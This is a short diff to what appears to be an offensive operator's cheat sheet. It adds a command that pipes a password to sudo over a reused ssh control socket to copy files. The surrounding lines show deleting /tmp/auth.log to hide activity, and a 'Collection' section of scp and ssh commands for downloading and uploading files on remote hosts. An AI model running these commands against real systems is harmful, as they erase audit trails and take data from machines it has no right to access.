@@ -123,6 +123,9 @@ rm -rf /tmp/auth.log
 ***Collection***
 scp -P <port> <user>@<ip>:<wherefileiscomingfrom> <user>@<ip>:<wherefileisgoing>	
 scp -o ControlPath=/tmp/<T#> <user>@<ip>:<wherefileiscomingfrom> <user>@<ip>:<wherefileisgoing>	
+ssh -S /tmp/T# \| sudo --prompt="" -S -- cat <file> > <directory to place copy> << EOF
+<password>
+EOF
 ssh -S /tmp/T# <user>@<Remote_IP > -p <ssh_Port> “cat <file>” > hist					Download
 ssh -S /tmp/T# <user>@<Remote_IP > -p <ssh_Port> “cat > <file>” < hist				Upload
 du -s
